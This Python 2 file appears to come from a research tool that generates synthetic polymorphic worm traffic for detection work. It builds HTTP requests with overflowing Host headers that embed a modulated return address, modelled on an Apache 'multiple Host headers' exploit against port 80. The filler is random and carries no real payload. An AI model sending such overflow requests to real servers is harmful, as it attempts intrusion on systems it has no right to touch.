import worm_gen
#from worm_gen import random_bytes
import string
import random
import struct

def _rand_header():
    return worm_gen.random_bytes(random.randrange(3,10), \
           string.letters + string.digits) + ": " + \
           worm_gen.random_bytes(random.randrange(10,20), \
                                 string.letters + string.digits) + "\r\n"

counter = 0
p = 0
def special_random_bytes(count, safe):
    buf = []
    import random
    import struct
    global counter
    global p

    while len(buf) < count:
        if random.random() < p:
            tmp = struct.pack('H', counter)
        else:
            tmp = worm_gen.random_bytes(2, safe)
        buf.append(tmp[0])
        buf.append(tmp[1])
        counter += 1
    return ''.join(buf[:count])

class ApacheHost(worm_gen.WormGen):
    """
    Synthetic polymorphic worm based on the Apache Knacker exploit.
    """

    def __init__(self, fname="apache_host", 
                pname="Apache Multiple Host Headers", 
                ra = 0xbfff8888L, 
                modulation=0x7777,
                random_patterns=False, 
                new_random_patterns=0): 
        self.ra = ra
        self.modulation = modulation 
        self.pname = pname
        self.fname = fname
        self.random_patterns= random_patterns
        self.new_random_patterns = new_random_patterns
        global p
        p = new_random_patterns

    def generate(self, count):

        if self.random_patterns:
            safe_chars = ['a', 'b']
        else:
            safe_chars = [chr(i) for i in xrange(256)]
            for i in string.whitespace:
                safe_chars.remove(i)
            safe_chars.remove(chr(0))

        if self.new_random_patterns:
            random_bytes = special_random_bytes
        else: 
            random_bytes = worm_gen.random_bytes

        samples = []
        for i in xrange(count):
            global counter
            counter = 0

            this_ra = self.ra + random.randint(-self.modulation, 
                                                self.modulation)
            request = 'GET ' + random_bytes(10, string.letters + string.digits)
            request += " HTTP/1.1\r\n"

            for j in xrange(1):
                request += _rand_header()
                request += "Host: " + random_bytes(400, safe_chars) + "\r\n"
            request += _rand_header()
            request += ("Host: " + random_bytes(390, safe_chars) + 
                       struct.pack('L', this_ra) + random_bytes(10, safe_chars) 
                       + "\r\n")
            yield(request)

    ports = property(lambda self: [80])
